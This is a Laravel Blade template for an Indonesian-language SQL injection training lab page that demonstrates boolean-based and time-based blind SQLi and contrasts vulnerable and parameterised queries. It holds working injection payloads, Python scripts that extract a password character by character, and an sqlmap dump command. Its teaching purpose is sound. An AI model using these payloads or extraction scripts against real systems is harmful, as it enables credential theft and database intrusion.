{{-- ============================================ --}}
{{-- SQLI LAB: Blind SQL Injection Demo --}}
{{-- Boolean-based & Time-based Blind SQLi --}}
{{-- ============================================ --}}

@extends('layouts.app')

@section('title', 'Blind SQL Injection - Demo')

@section('content')
<div class="container py-4">
    <div class="row justify-content-center">
        <div class="col-lg-11">

            {{-- Breadcrumb --}}
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('sqli-lab.index') }}">SQLi Lab</a></li>
                    <li class="breadcrumb-item active">Blind SQL Injection</li>
                </ol>
            </nav>

            {{-- Warning Banner --}}
            <div class="alert alert-danger">
                <div class="d-flex align-items-center">
                    <i class="bi bi-exclamation-octagon-fill fs-2 me-3"></i>
                    <div>
                        <h5 class="alert-heading mb-1">BLIND SQL INJECTION DEMO!</h5>
                        <p class="mb-0 small">
                            Demo ini menunjukkan teknik <strong>Blind SQLi</strong> - serangan tanpa output langsung.
                            Attacker menggunakan respons TRUE/FALSE atau delay waktu untuk mengekstrak data.
                        </p>
                    </div>
                </div>
            </div>

            {{-- Header --}}
            <div class="text-center mb-4">
                <h1 class="display-6 fw-bold">
                    <i class="bi bi-eye-slash text-danger"></i>
                    Blind SQL Injection Demo
                </h1>
                <p class="text-muted">
                    Teknik SQLi ketika aplikasi tidak menampilkan data atau error secara langsung
                </p>
            </div>

            {{-- Explanation Card --}}
            <div class="card mb-4 border-info">
                <div class="card-header bg-info text-white">
                    <h5 class="mb-0"><i class="bi bi-info-circle"></i> Apa itu Blind SQL Injection?</h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6><i class="bi bi-toggle-on text-primary"></i> Boolean-based Blind SQLi</h6>
                            <p class="small text-muted">
                                Aplikasi memberikan respons berbeda untuk kondisi TRUE vs FALSE.
                                Attacker mengajukan pertanyaan yes/no untuk mengekstrak data karakter per karakter.
                            </p>
                            <code class="small d-block bg-light p-2 rounded">
                                ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
                            </code>
                        </div>
                        <div class="col-md-6">
                            <h6><i class="bi bi-clock text-warning"></i> Time-based Blind SQLi</h6>
                            <p class="small text-muted">
                                Aplikasi tidak memberikan respons berbeda, tapi attacker bisa menggunakan
                                fungsi delay (SLEEP/pg_sleep) untuk mengekstrak data berdasarkan waktu respons.
                            </p>
                            <code class="small d-block bg-light p-2 rounded">
                                1; SELECT CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--
                            </code>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row">
                {{-- Boolean-based Blind SQLi --}}
                <div class="col-lg-6 mb-4">
                    <div class="card h-100 border-primary">
                        <div class="card-header bg-primary text-white">
                            <h5 class="mb-0">
                                <i class="bi bi-toggle-on"></i> Boolean-based Blind SQLi
                            </h5>
                        </div>
                        <div class="card-body">
                            <p class="text-muted small">
                                Form ini mengecek apakah username ada di database.
                                Hanya mengembalikan <strong>YES</strong> atau <strong>NO</strong> - tidak ada data detail.
                            </p>

                            {{-- Result Display --}}
                            <div id="booleanResult" class="mb-3" style="display: none;">
                                <div class="alert mb-2" id="booleanAlert">
                                    <div class="d-flex align-items-center">
                                        <i class="bi fs-4 me-2" id="booleanIcon"></i>
                                        <div>
                                            <strong id="booleanMessage"></strong>
                                            <small class="d-block text-muted" id="booleanTime"></small>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {{-- Form --}}
                            <form id="booleanForm">
                                @csrf
                                <div class="mb-3">
                                    <label class="form-label">Username to Check</label>
                                    <input type="text" name="username" id="booleanUsername"
                                           class="form-control" placeholder="Masukkan username">
                                </div>
                                <button type="submit" class="btn btn-primary w-100" id="booleanSubmit">
                                    <i class="bi bi-search"></i> Check User Exists
                                </button>
                            </form>

                            {{-- Query Display --}}
                            <div id="booleanQueryBox" class="mt-3" style="display: none;">
                                <label class="form-label small text-muted">Query yang dieksekusi:</label>
                                <pre class="bg-dark text-light p-2 rounded small mb-0"><code id="booleanQuery"></code></pre>
                            </div>

                            {{-- Payloads --}}
                            <div class="mt-4">
                                <h6 class="text-danger"><i class="bi bi-lightning"></i> Coba Payload Ini:</h6>

                                <div class="mb-2">
                                    <small class="text-muted">1. Cek user admin ada:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="admin">
                                        <code>admin</code> → Seharusnya TRUE
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">2. Boolean injection - selalu TRUE:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="' OR '1'='1">
                                        <code>' OR '1'='1</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">3. Cek huruf pertama password admin = 's':</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="admin' AND SUBSTRING(password,1,1)='s'-- ">
                                        <code>admin' AND SUBSTRING(password,1,1)='s'-- </code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">4. Extract huruf ke-2 password = 'u':</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="admin' AND SUBSTRING(password,2,1)='u'-- ">
                                        <code>admin' AND SUBSTRING(password,2,1)='u'-- </code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">5. Cek panjang password > 10:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="admin' AND LENGTH(password)>10-- ">
                                        <code>admin' AND LENGTH(password)>10-- </code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">6. Cek nama database dimulai 's':</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start boolean-payload"
                                            data-payload="admin' AND SUBSTRING(current_database(),1,1)='s'-- ">
                                        <code>admin' AND SUBSTRING(current_database(),1,1)='s'-- </code>
                                    </button>
                                </div>
                            </div>

                            {{-- Info --}}
                            <div class="alert alert-info mt-3 small mb-0">
                                <i class="bi bi-lightbulb"></i> <strong>Cara kerja:</strong><br>
                                Dengan iterasi payload #3-4 untuk setiap posisi (1,2,3...) dan setiap karakter (a-z, 0-9),
                                attacker bisa extract password lengkap: <code>supersecret123</code>
                            </div>
                        </div>
                    </div>
                </div>

                {{-- Time-based Blind SQLi --}}
                <div class="col-lg-6 mb-4">
                    <div class="card h-100 border-warning">
                        <div class="card-header bg-warning text-dark">
                            <h5 class="mb-0">
                                <i class="bi bi-clock"></i> Time-based Blind SQLi
                            </h5>
                        </div>
                        <div class="card-body">
                            <p class="text-muted small">
                                Form ini mengambil nama produk berdasarkan ID.
                                Tidak ada perbedaan output, tapi attacker bisa menggunakan <strong>delay</strong>.
                            </p>

                            {{-- Result Display --}}
                            <div id="timeResult" class="mb-3" style="display: none;">
                                <div class="alert alert-secondary mb-2">
                                    <div class="d-flex align-items-center">
                                        <i class="bi bi-box fs-4 me-2"></i>
                                        <div>
                                            <strong>Product: </strong><span id="timeProductName"></span>
                                            <small class="d-block" id="timeExecution"></small>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {{-- Form --}}
                            <form id="timeForm">
                                @csrf
                                <div class="mb-3">
                                    <label class="form-label">Product ID</label>
                                    <input type="text" name="id" id="timeId"
                                           class="form-control" placeholder="Masukkan ID produk (1-8)">
                                </div>
                                <button type="submit" class="btn btn-warning w-100" id="timeSubmit">
                                    <i class="bi bi-search"></i> Get Product Name
                                </button>
                            </form>

                            {{-- Query Display --}}
                            <div id="timeQueryBox" class="mt-3" style="display: none;">
                                <label class="form-label small text-muted">Query yang dieksekusi:</label>
                                <pre class="bg-dark text-light p-2 rounded small mb-0"><code id="timeQuery"></code></pre>
                            </div>

                            {{-- Payloads --}}
                            <div class="mt-4">
                                <h6 class="text-danger"><i class="bi bi-lightning"></i> Coba Payload Ini (PostgreSQL):</h6>

                                <div class="mb-2">
                                    <small class="text-muted">1. Normal request (baseline):</small>
                                    <button class="btn btn-sm btn-outline-warning d-block w-100 text-start time-payload"
                                            data-payload="1">
                                        <code>1</code> → Catat waktu normal (~50ms)
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">2. Simple delay 2 detik:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start time-payload"
                                            data-payload="1 AND pg_sleep(2) IS NULL">
                                        <code>1 AND pg_sleep(2) IS NULL</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">3. Delay jika admin exists:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start time-payload"
                                            data-payload="1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sqli_lab_users WHERE username='admin')>0 THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NULL">
                                        <code class="small">CASE WHEN admin exists THEN sleep(2)</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">4. Extract: huruf ke-1 password = 's'?</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start time-payload"
                                            data-payload="1 AND (SELECT CASE WHEN SUBSTRING(password,1,1)='s' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM sqli_lab_users WHERE username='admin') IS NULL">
                                        <code class="small">Delay jika password[1]='s'</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">5. Extract: huruf ke-2 password = 'u'?</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start time-payload"
                                            data-payload="1 AND (SELECT CASE WHEN SUBSTRING(password,2,1)='u' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM sqli_lab_users WHERE username='admin') IS NULL">
                                        <code class="small">Delay jika password[2]='u'</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">6. Extract nama database:</small>
                                    <button class="btn btn-sm btn-outline-danger d-block w-100 text-start time-payload"
                                            data-payload="1 AND (SELECT CASE WHEN SUBSTRING(current_database(),1,1)='s' THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NULL">
                                        <code class="small">Delay jika db_name[1]='s'</code>
                                    </button>
                                </div>
                            </div>


                            {{-- MySQL Payloads --}}
                            <div class="mt-4">
                                <h6 class="text-warning"><i class="bi bi-lightning"></i> Payload MySQL (jika pakai MySQL):</h6>

                                <div class="mb-2">
                                    <small class="text-muted">1. Simple delay 2 detik:</small>
                                    <button class="btn btn-sm btn-outline-warning d-block w-100 text-start time-payload"
                                            data-payload="1 AND SLEEP(2)">
                                        <code>1 AND SLEEP(2)</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">2. Delay jika admin exists:</small>
                                    <button class="btn btn-sm btn-outline-warning d-block w-100 text-start time-payload"
                                            data-payload="1 AND IF((SELECT COUNT(*) FROM sqli_lab_users WHERE username='admin')>0, SLEEP(2), 0)">
                                        <code class="small">IF(admin exists, SLEEP(2), 0)</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">3. Extract: huruf ke-1 password = 's'?</small>
                                    <button class="btn btn-sm btn-outline-warning d-block w-100 text-start time-payload"
                                            data-payload="1 AND IF((SELECT SUBSTRING(password,1,1) FROM sqli_lab_users WHERE username='admin')='s', SLEEP(2), 0)">
                                        <code class="small">IF(password[1]='s', SLEEP(2), 0)</code>
                                    </button>
                                </div>

                                <div class="mb-2">
                                    <small class="text-muted">4. Extract nama database:</small>
                                    <button class="btn btn-sm btn-outline-warning d-block w-100 text-start time-payload"
                                            data-payload="1 AND IF(SUBSTRING(database(),1,1)='s', SLEEP(2), 0)">
                                        <code class="small">IF(db_name[1]='s', SLEEP(2), 0)</code>
                                    </button>
                                </div>
                            </div>

                            {{-- Time Indicator --}}
                            <div class="alert alert-info mt-3 small">
                                <i class="bi bi-lightbulb"></i> <strong>Cara kerja:</strong><br>
                                • Response <strong>&lt; 500ms</strong> = kondisi FALSE<br>
                                • Response <strong>&gt; 2000ms</strong> = kondisi TRUE (delay terjadi!)<br>
                                <span class="text-muted">Iterasi semua karakter untuk extract password lengkap.</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- How Attackers Extract Data --}}
            <div class="card mt-2 mb-4">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-code-slash"></i> Bagaimana Attacker Extract Data dengan Blind SQLi?
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Algoritma Boolean-based (Python):</h6>
                            <pre class="bg-light p-3 rounded small"><code># Extract password admin karakter per karakter
import requests

password = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for pos in range(1, 20):  # max 20 karakter
    for char in charset:
        payload = f"admin' AND SUBSTRING(password,{pos},1)='{char}'-- "
        r = requests.post(url, data={"username": payload})

        if "User EXISTS" in r.text:
            password += char
            print(f"Found: {password}")
            break
    else:
        break  # tidak ada karakter cocok = selesai

print(f"Password admin: {password}")
# Output: supersecret123</code></pre>
                        </div>
                        <div class="col-md-6">
                            <h6>Algoritma Time-based (Python):</h6>
                            <pre class="bg-light p-3 rounded small"><code># Extract dengan timing attack
import requests
import time

password = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for pos in range(1, 20):
    for char in charset:
        payload = f"""1 AND (SELECT CASE
            WHEN SUBSTRING(password,{pos},1)='{char}'
            THEN pg_sleep(2) ELSE pg_sleep(0) END
            FROM sqli_lab_users WHERE username='admin') IS NULL"""

        start = time.time()
        requests.post(url, data={"id": payload})
        elapsed = time.time() - start

        if elapsed > 1.5:  # delay detected!
            password += char
            print(f"Found: {password}")
            break

print(f"Password: {password}")</code></pre>
                        </div>
                    </div>

                    {{-- Live Demo Section --}}
                    <div class="alert alert-danger mt-3">
                        <h6><i class="bi bi-lightning"></i> Contoh Ekstraksi Password Admin:</h6>
                        <p class="mb-2 small">Password admin adalah <code>supersecret123</code> (14 karakter). Coba payload berikut secara berurutan:</p>
                        <div class="row small">
                            <div class="col-md-4">
                                <strong>Posisi 1-5:</strong>
                                <ul class="mb-0">
                                    <li>pos=1, char='s' → <span class="text-success">TRUE</span></li>
                                    <li>pos=2, char='u' → <span class="text-success">TRUE</span></li>
                                    <li>pos=3, char='p' → <span class="text-success">TRUE</span></li>
                                    <li>pos=4, char='e' → <span class="text-success">TRUE</span></li>
                                    <li>pos=5, char='r' → <span class="text-success">TRUE</span></li>
                                </ul>
                            </div>
                            <div class="col-md-4">
                                <strong>Posisi 6-10:</strong>
                                <ul class="mb-0">
                                    <li>pos=6, char='s' → <span class="text-success">TRUE</span></li>
                                    <li>pos=7, char='e' → <span class="text-success">TRUE</span></li>
                                    <li>pos=8, char='c' → <span class="text-success">TRUE</span></li>
                                    <li>pos=9, char='r' → <span class="text-success">TRUE</span></li>
                                    <li>pos=10, char='e' → <span class="text-success">TRUE</span></li>
                                </ul>
                            </div>
                            <div class="col-md-4">
                                <strong>Posisi 11-14:</strong>
                                <ul class="mb-0">
                                    <li>pos=11, char='t' → <span class="text-success">TRUE</span></li>
                                    <li>pos=12, char='1' → <span class="text-success">TRUE</span></li>
                                    <li>pos=13, char='2' → <span class="text-success">TRUE</span></li>
                                    <li>pos=14, char='3' → <span class="text-success">TRUE</span></li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-warning mb-0">
                        <i class="bi bi-exclamation-triangle"></i>
                        <strong>Tools otomatis:</strong> <code>sqlmap</code> bisa mengekstrak seluruh database dalam hitungan menit!<br>
                        <code class="small">sqlmap -u "http://target/check?username=test" --dump</code>
                    </div>
                    </div>
                </div>
            </div>

            {{-- Vulnerable vs Secure Code --}}
            <div class="row">
                <div class="col-md-6">
                    <div class="card border-danger h-100">
                        <div class="card-header bg-danger text-white">
                            <h6 class="mb-0"><i class="bi bi-x-circle"></i> Kode Vulnerable</h6>
                        </div>
                        <div class="card-body">
                            <pre class="bg-dark text-light p-3 rounded small"><code><span class="text-danger">// VULNERABLE: ID langsung di-concatenate</span>
$query = "SELECT name FROM products
          WHERE id = <span class="text-danger">{$id}</span>";
$result = DB::select($query);

<span class="text-danger">// VULNERABLE: Username langsung masuk</span>
$query = "SELECT COUNT(*) FROM users
          WHERE username = '<span class="text-danger">{$username}</span>'";
$exists = DB::select($query)[0]->count > 0;</code></pre>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card border-success h-100">
                        <div class="card-header bg-success text-white">
                            <h6 class="mb-0"><i class="bi bi-check-circle"></i> Kode Secure</h6>
                        </div>
                        <div class="card-body">
                            <pre class="bg-dark text-light p-3 rounded small"><code><span class="text-success">// SECURE: Parameter binding</span>
$product = Product::find($id);
// atau
$product = DB::select(
    "SELECT name FROM products WHERE id = <span class="text-success">?</span>",
    [<span class="text-success">$id</span>]
);

<span class="text-success">// SECURE: Eloquent</span>
$exists = User::where('username', $username)->exists();</code></pre>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Navigation --}}
            <div class="d-flex justify-content-between mt-4">
                <a href="{{ route('sqli-lab.vulnerable-login') }}" class="btn btn-outline-danger">
                    <i class="bi bi-arrow-left"></i> Vulnerable Login
                </a>
                <a href="{{ route('sqli-lab.secure-search') }}" class="btn btn-success">
                    Lihat Cara Aman <i class="bi bi-shield-check"></i>
                </a>
            </div>

        </div>
    </div>
</div>

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Boolean-based form
    const booleanForm = document.getElementById('booleanForm');
    const booleanSubmit = document.getElementById('booleanSubmit');

    booleanForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('booleanUsername').value;
        booleanSubmit.disabled = true;
        booleanSubmit.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Checking...';

        fetch('{{ route("sqli-lab.blind-sqli-boolean") }}', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ username: username })
        })
        .then(response => response.json())
        .then(data => {
            const resultDiv = document.getElementById('booleanResult');
            const alert = document.getElementById('booleanAlert');
            const icon = document.getElementById('booleanIcon');
            const message = document.getElementById('booleanMessage');
            const time = document.getElementById('booleanTime');
            const queryBox = document.getElementById('booleanQueryBox');
            const queryCode = document.getElementById('booleanQuery');

            resultDiv.style.display = 'block';
            queryBox.style.display = 'block';

            if (data.error) {
                alert.className = 'alert alert-danger mb-2';
                icon.className = 'bi bi-x-circle fs-4 me-2';
                message.textContent = 'Error: ' + data.error;
            } else if (data.exists) {
                alert.className = 'alert alert-success mb-2';
                icon.className = 'bi bi-check-circle fs-4 me-2';
                message.textContent = 'User EXISTS! ✓';
            } else {
                alert.className = 'alert alert-secondary mb-2';
                icon.className = 'bi bi-x-circle fs-4 me-2';
                message.textContent = 'User NOT FOUND ✗';
            }

            time.textContent = 'Execution time: ' + data.executionTime + 'ms';
            queryCode.textContent = data.query;
        })
        .finally(() => {
            booleanSubmit.disabled = false;
            booleanSubmit.innerHTML = '<i class="bi bi-search"></i> Check User Exists';
        });
    });

    // Time-based form
    const timeForm = document.getElementById('timeForm');
    const timeSubmit = document.getElementById('timeSubmit');

    timeForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const id = document.getElementById('timeId').value;
        const startTime = Date.now();

        timeSubmit.disabled = true;
        timeSubmit.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Loading...';

        fetch('{{ route("sqli-lab.blind-sqli-time") }}', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ id: id })
        })
        .then(response => response.json())
        .then(data => {
            const clientTime = Date.now() - startTime;

            const resultDiv = document.getElementById('timeResult');
            const productName = document.getElementById('timeProductName');
            const execution = document.getElementById('timeExecution');
            const queryBox = document.getElementById('timeQueryBox');
            const queryCode = document.getElementById('timeQuery');

            resultDiv.style.display = 'block';
            queryBox.style.display = 'block';

            productName.textContent = data.productName || '(not found)';

            // Highlight if delayed (potential time-based injection success)
            if (clientTime > 1500) {
                execution.innerHTML = '<span class="text-danger fw-bold">⚠️ Response time: ' + clientTime + 'ms (DELAYED!)</span>';
            } else {
                execution.innerHTML = 'Response time: ' + clientTime + 'ms (normal)';
            }

            queryCode.textContent = data.query;
        })
        .finally(() => {
            timeSubmit.disabled = false;
            timeSubmit.innerHTML = '<i class="bi bi-search"></i> Get Product Name';
        });
    });

    // Payload buttons
    document.querySelectorAll('.boolean-payload').forEach(btn => {
        btn.addEventListener('click', function() {
            document.getElementById('booleanUsername').value = this.dataset.payload;
        });
    });

    document.querySelectorAll('.time-payload').forEach(btn => {
        btn.addEventListener('click', function() {
            document.getElementById('timeId').value = this.dataset.payload;
        });
    });
});
</script>
@endpush

{{-- Inline script fallback --}}
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Boolean-based form
    const booleanForm = document.getElementById('booleanForm');
    const booleanSubmit = document.getElementById('booleanSubmit');

    booleanForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('booleanUsername').value;
        booleanSubmit.disabled = true;
        booleanSubmit.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Checking...';

        fetch('{{ route("sqli-lab.blind-sqli-boolean") }}', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ username: username })
        })
        .then(response => response.json())
        .then(data => {
            const resultDiv = document.getElementById('booleanResult');
            const alert = document.getElementById('booleanAlert');
            const icon = document.getElementById('booleanIcon');
            const message = document.getElementById('booleanMessage');
            const time = document.getElementById('booleanTime');
            const queryBox = document.getElementById('booleanQueryBox');
            const queryCode = document.getElementById('booleanQuery');

            resultDiv.style.display = 'block';
            queryBox.style.display = 'block';

            if (data.error) {
                alert.className = 'alert alert-danger mb-2';
                icon.className = 'bi bi-x-circle fs-4 me-2';
                message.textContent = 'Error: ' + data.error;
            } else if (data.exists) {
                alert.className = 'alert alert-success mb-2';
                icon.className = 'bi bi-check-circle fs-4 me-2';
                message.textContent = 'User EXISTS! ✓';
            } else {
                alert.className = 'alert alert-secondary mb-2';
                icon.className = 'bi bi-x-circle fs-4 me-2';
                message.textContent = 'User NOT FOUND ✗';
            }

            time.textContent = 'Execution time: ' + data.executionTime + 'ms';
            queryCode.textContent = data.query;
        })
        .finally(() => {
            booleanSubmit.disabled = false;
            booleanSubmit.innerHTML = '<i class="bi bi-search"></i> Check User Exists';
        });
    });

    // Time-based form
    const timeForm = document.getElementById('timeForm');
    const timeSubmit = document.getElementById('timeSubmit');

    timeForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const id = document.getElementById('timeId').value;
        const startTime = Date.now();

        timeSubmit.disabled = true;
        timeSubmit.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Loading...';

        fetch('{{ route("sqli-lab.blind-sqli-time") }}', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ id: id })
        })
        .then(response => response.json())
        .then(data => {
            const clientTime = Date.now() - startTime;

            const resultDiv = document.getElementById('timeResult');
            const productName = document.getElementById('timeProductName');
            const execution = document.getElementById('timeExecution');
            const queryBox = document.getElementById('timeQueryBox');
            const queryCode = document.getElementById('timeQuery');

            resultDiv.style.display = 'block';
            queryBox.style.display = 'block';

            productName.textContent = data.productName || '(not found)';

            // Highlight if delayed (potential time-based injection success)
            if (clientTime > 1500) {
                execution.innerHTML = '<span class="text-danger fw-bold">⚠️ Response time: ' + clientTime + 'ms (DELAYED!)</span>';
            } else {
                execution.innerHTML = 'Response time: ' + clientTime + 'ms (normal)';
            }

            queryCode.textContent = data.query;
        })
        .finally(() => {
            timeSubmit.disabled = false;
            timeSubmit.innerHTML = '<i class="bi bi-search"></i> Get Product Name';
        });
    });

    // Payload buttons
    document.querySelectorAll('.boolean-payload').forEach(btn => {
        btn.addEventListener('click', function() {
            document.getElementById('booleanUsername').value = this.dataset.payload;
        });
    });

    document.querySelectorAll('.time-payload').forEach(btn => {
        btn.addEventListener('click', function() {
            document.getElementById('timeId').value = this.dataset.payload;
        });
    });
});
</script>
@endsection
